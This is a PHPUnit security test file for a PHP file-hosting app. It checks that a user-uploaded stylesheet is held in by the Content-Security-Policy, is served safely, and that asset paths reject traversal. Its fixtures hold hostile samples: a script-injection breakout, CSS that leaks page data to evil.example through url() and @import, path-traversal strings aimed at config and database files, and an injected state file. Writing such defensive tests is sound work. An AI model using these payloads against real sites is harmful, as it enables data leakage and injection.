<?php

declare(strict_types=1);

namespace Linkrot\Tests;

use Linkrot\App;
use Linkrot\Auth\InMemoryRateLimiter;
use Linkrot\Config;
use Linkrot\Database;
use Linkrot\DownloadMode;
use Linkrot\Http\Request;
use Linkrot\Http\Response;
use Linkrot\Tests\Support\AppTestCase;
use PHPUnit\Framework\Attributes\DataProvider;

/**
 * What a stylesheet can do. It is the owner's own (the API token holder uploads it, it applies to that host only), so the
 * question is not whether it can be trusted but what the browser lets it do: the Content-Security-Policy of every HTML
 * route is the wall, and these tests pin it, together with how the file is stored, named and served.
 */
final class CssSecurityTest extends AppTestCase
{
    private const string HOSTILE = "/* MARKER-HOSTILE */\n</style><script>alert(1)</script>\n@import url(https://evil.example/x.css);\n@font-face { font-family: x; src: url(https://evil.example/f.woff2) }\nbody { background: url(https://evil.example/p.gif?c=1) }\na[href^='/dl/a'] { background: url(https://evil.example/leak?p=a) }\n";

    protected function config(): Config
    {
        return new Config(baseUrl: 'https://lr.example', chunkSize: 10, maxRmAfter: '30d', downloadMode: DownloadMode::Xaccel);
    }

    private function hostile(): string
    {
        $response = $this->request('PUT', '/api/v1/custom/css', raw: self::HOSTILE);
        self::assertSame(200, $response->status, $response->body);
        $url = json_decode($response->body, true)['url'] ?? null;
        self::assertIsString($url);

        return $url;
    }

    /** @return array<string, list<string>> the directives of a policy by name */
    private function policy(Response $response): array
    {
        $header = $response->headers['Content-Security-Policy'] ?? '';
        $directives = [];
        foreach (array_filter(array_map(trim(...), explode(';', $header))) as $directive) {
            $words = preg_split('~\s+~', $directive) ?: [];
            $directives[array_shift($words)] = $words;
        }

        return $directives;
    }

    /** @return iterable<string, array{string, bool}> path, may show Markdown images (a page of the host) */
    public static function htmlRoutes(): iterable
    {
        yield 'start page' => ['/', false];
        yield 'file page' => ['/file/%s/a.txt', false];
        yield 'file page, redirect to the name' => ['/file/%s', false];
        yield 'not found' => ['/file/unknown', false];
        yield 'markdown page' => ['/page/imprint', true];
        yield 'markdown page that does not exist' => ['/page/nothing', false];
    }

    #[DataProvider('htmlRoutes')]
    public function testEveryHtmlRouteHasAPolicyThatLeavesAStylesheetNothingToReach(string $route, bool $markdown): void
    {
        $this->hostile();
        $this->request('PUT', '/api/v1/pages/imprint', raw: "---\ntitle: Imprint\n---\nHello\n");
        $path = sprintf($route, $this->upload('abc'));

        $response = $this->request('GET', $path, auth: false);

        if ($response->status === 302) {
            return; // the redirect has no body to attack
        }
        $csp = $this->policy($response);
        self::assertSame(['none'], array_map(static fn(string $w): string => trim($w, "'"), $csp['default-src'] ?? []), "$path: everything not named is forbidden");
        self::assertSame(["'self'"], $csp['style-src'] ?? null, "$path: no external and no inline stylesheet, so no @import from elsewhere");
        self::assertSame($markdown ? ["'self'", 'https:', 'data:'] : ["'self'"], $csp['img-src'] ?? null, "$path: where url() images may come from");
        foreach (['font-src', 'connect-src', 'frame-src', 'object-src', 'form-action', 'media-src'] as $directive) {
            self::assertArrayNotHasKey($directive, $csp, "$path: $directive falls back to default-src 'none'");
        }
        $joined = implode(' ', array_merge(...array_values($csp)));
        self::assertStringNotContainsString('unsafe-eval', $joined);
        self::assertStringNotContainsString('*', $joined);
        self::assertSame(["'unsafe-inline'"], $csp['style-src-attr'] ?? null, 'inline style attributes only');
        $scripts = $csp['script-src'] ?? [];
        self::assertContains($scripts, [[], ["'self'"]], "$path: scripts only from this origin, if at all");
    }

    public function testTheStylesheetIsLinkedNeverInlined(): void
    {
        $url = $this->hostile();
        $id = $this->upload('abc');

        foreach (['/', "/file/$id/a.txt", '/file/unknown'] as $path) {
            $body = $this->request('GET', $path, auth: false)->body;
            self::assertStringContainsString('<link rel="stylesheet" href="' . $url . '">', $body, $path);
            self::assertStringNotContainsString('MARKER-HOSTILE', $body, "$path: the stylesheet is not part of the page");
            self::assertStringNotContainsString('evil.example', $body, $path);
            self::assertStringNotContainsString('alert(1)', $body, $path);
        }
    }

    public function testTheHostileStylesheetIsServedAsPlainCssAndNothingElse(): void
    {
        $url = $this->hostile();

        $response = $this->request('GET', $url, auth: false);

        self::assertSame(200, $response->status);
        self::assertSame(self::HOSTILE, $response->body, 'byte for byte, no rewriting that could be wrong');
        self::assertSame('text/css; charset=utf-8', $response->headers['Content-Type']);
        self::assertSame('nosniff', $response->headers['X-Content-Type-Options'], 'a browser must not take it for HTML or a script');
        self::assertArrayNotHasKey('Content-Disposition', $response->headers);
        self::assertArrayNotHasKey('Set-Cookie', $response->headers);
    }

    public function testTheNameOfAStylesheetIsItsHashAndNothingElse(): void
    {
        $url = $this->hostile();
        $hash = substr(hash('sha256', self::HOSTILE), 0, 16);

        self::assertSame("/assets/user.$hash.css", $url);
        self::assertFileExists($this->dir . "/custom/user.$hash.css");
        self::assertSame(self::HOSTILE, file_get_contents($this->dir . "/custom/user.$hash.css"));
    }

    /** @return iterable<string, array{string}> */
    public static function paths(): iterable
    {
        yield 'parent directory' => ['/assets/../config.php'];
        yield 'parent directory after the hash' => ['/assets/user.0123456789abcdef.css/../../config.php'];
        yield 'upper case hash' => ['/assets/user.0123456789ABCDEF.css'];
        yield 'trailing newline' => ["/assets/user.0123456789abcdef.css\n"];
        yield 'trailing nul' => ["/assets/user.0123456789abcdef.css\0"];
        yield 'too short hash' => ['/assets/user.0123456789abcde.css'];
        yield 'too long hash' => ['/assets/user.0123456789abcdef0.css'];
        yield 'the lock file' => ['/assets/css.lock'];
        yield 'the state file' => ['/assets/css.json'];
        yield 'the database' => ['/assets/linkrot.sqlite'];
        yield 'a data file' => ['/assets/' . 'aaaaaaaaaaaaaaaa'];
    }

    #[DataProvider('paths')]
    public function testNothingButAStylesheetNameIsServedFromAssets(string $path): void
    {
        $this->hostile();

        self::assertSame(404, $this->request('GET', $path, auth: false)->status);
    }

    public function testATamperedStateFileCannotInjectMarkupOrReachOtherFiles(): void
    {
        $this->hostile();
        file_put_contents($this->dir . '/sentinel', 'keep');
        file_put_contents($this->dir . '/custom/css.json', json_encode([
            'current' => '"><script>alert(1)</script>',
            'retired' => [['hash' => '../sentinel', 'at' => 1], ['hash' => '0123456789abcdef', 'at' => 1]],
        ]));
        $this->now += 10 * 86400;

        $body = $this->request('GET', '/', auth: false)->body;
        $this->call('POST', '/api/v1/cleanup');

        self::assertStringNotContainsString('<script>alert', $body);
        self::assertStringNotContainsString('/assets/user.', $body, 'a current value that is no hash is no stylesheet');
        self::assertFileExists($this->dir . '/sentinel', 'a retired name that is no hash is never turned into a path');
    }

    public function testChangingTheStylesheetNeedsAToken(): void
    {
        foreach ([['PUT', self::HOSTILE], ['DELETE', '']] as [$method, $body]) {
            self::assertSame(401, $this->request($method, '/api/v1/custom/css', raw: $body, auth: false)->status, $method);
        }
        self::assertSame(401, $this->request('GET', '/api/v1/custom/css', auth: false)->status);
    }

    public function testAHostDoesNotServeTheStylesheetOfAnotherHost(): void
    {
        $url = $this->hostile();
        $otherDir = $this->dir . '-other';
        mkdir($otherDir);
        try {
            Database::openMigrated($otherDir . '/linkrot.sqlite');
            $other = new App($this->config(), $otherDir, 'other.example', new InMemoryRateLimiter(10, 900, fn(): int => $this->now), fn(): int => $this->now);

            $mine = $this->request('GET', $url, auth: false);
            $theirs = $other->handle(new Request('GET', $url, [], [], ['REMOTE_ADDR' => '192.0.2.1']));

            self::assertSame(200, $mine->status);
            self::assertSame(404, $theirs->status, 'the name is only the hash of the content: it does not say whose it is');
            self::assertStringNotContainsString($url, $other->handle(new Request('GET', '/', [], [], ['REMOTE_ADDR' => '192.0.2.1']))->body);
        } finally {
            $remove = static function (string $path) use (&$remove): void {
                foreach (scandir($path) ?: [] as $entry) {
                    if ($entry !== '.' && $entry !== '..') {
                        is_dir("$path/$entry") ? $remove("$path/$entry") : unlink("$path/$entry");
                    }
                }
                rmdir($path);
            };
            $remove($otherDir);
        }
    }
}
